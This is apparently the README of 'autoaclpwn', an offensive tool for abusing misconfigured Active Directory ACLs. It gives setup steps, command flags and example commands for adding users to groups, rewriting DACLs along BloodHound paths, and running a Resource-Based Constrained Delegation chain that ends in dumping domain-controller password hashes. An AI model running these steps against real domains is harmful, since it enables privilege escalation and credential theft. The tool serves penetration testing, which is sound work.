# autoaclpwn
This is a tool for exploiting misconfigured ACLs in Active Directory. You can manually add users to a group, export a graph from BloodHound and use it to add the user to several groups, or import a BloodHound graph to perform an entire Resource-Based Constrained Delegation attack chain, up to and including dumping secrets.

## Setup
```
git clone https://github.com/jhicks_r7/autoaclpwn
pip3 install -r requirements.txt
python3 autoaclpwn.py -h
```

## Usage
The following arguments are required for every mode autoaclpwn.py can run in:

```
-u USER, --user USER  username to add/modify group
-p PASSWORD, --password PASSWORD
                        The user's password
-d DOMAIN, --domain DOMAIN
                        Target domain name
-dc-ip DC IP          Domain Controller IP address

```

### Manually adding a user to a group or modifying DACLs

If you would like to manually add a user to a group, modify a DACL, or both, you can use the following flags:
```
--add-member          Add the member to the group
--modify-dacl         Modify the DACL to add addmember permission
-g GROUP, --group GROUP
                        Target group name. Required if not using BloodHound file
```

Example command:

```
python3 autoaclpwn.py -u username -p 'P@ssword' -d hackerlab.local -dc-ip 172.16.1.10 -g 'Cool Person Group' --add-member --modify-dacl
```

### Automatically adding a user to/modifying DACLs of multiple groups
If you have an exported BloodHound graph, in JSON format, you can utilize the -b flag to add the member to a series of groups.

__A note on BloodHound JSON graphs__: For best results, ensure that your graph starts with the user that you have credentials for and want to modify and ends with either the last group you would like them to be added to, or a computer that you wish to perform additional exploitation on. The easiest way to get this is to use BloodHound's path tool and export the resulting path. Additionally, the graph should have a __single__ path of edges from the user to the final target. Having multiple paths may or may not produce undesirable results.

As of this time, autoaclpwn supports the following BloodHound edges:
* MemberOf
* GenericWrite
* GenericAll
* AddMember
* AddSelf
* WriteDacl

Example command:
```
python3 autoaclpwn -u username -p 'P@ssword' -d hackerlab.local -dc-ip 172.16.1.10 -b graph.json
```

### Performing additional Resourced-Based Constrained Delegation steps
In addition to using a BloodHound graph, autoaclpwn can perform the following steps if your target ends in a computer that you will have gained GenericWrite or some functionally equivalant permissions, you can invoke various impacket commands to automatically perform the attack:

```
--add-computer        Add a computer to the account
--computer-name COMPUTER NAME
                        The name of the computer to add. Use with --add-computer
--computer-pass COMPUTER PASS
                        The password for the computer to be added. Use with --add-computer
--rbcd                Perform Resource-Based Constrained Delegation attack against the target. Requires --add-computer
--getst               Runs impacket's getST.py. Requires --add-computer and --rbcd
--impersonate USER TO IMPERSONATE
                        User to impersonate, used with --getST
--secretsdump         Dump secrets from a Domain Controller. Uses secretsdump.py
--fullauto            DO ALL THE THINGS. Probably dont do this in real life. Should also only target a DC at the moment
```

In addition, if using getST you must provide --impersonate, and can optionally provide an spn service:
```
 -spn-service SERVICE  The service to use as the service portion of the SPN for getST. Default: cifs
```

If using secretsdump, you can provide options for what you would like to dump:

```
-just-dc              Extract only NTDS.DIT data (NTLM hashes and Kerberos Keys)
-just-dc-ntlm         Extract only NTDS.DIT data (NTLM hashes only)
-just-dc-user USER    Extract only NTDS.DIT data for the user specified                                                                             
```

__Warning__: at the moment, if your graph ends in a group and not a computer, invoking these options will provide a warning, but allow you to attempt it anyways (it won't work). If your user account does not have the proper permissions to perform the options you selected, the script will still try and run them. It should just fail, but dont' hold me accountable if it does something weird.

## References/Sources
aclpwn:   https://github.com/fox-it/aclpwn.py
rbcd.py:  https://github.com/tothi/rbcd-attack/
impacket: https://github.com/SecureAuthCorp/impacket     
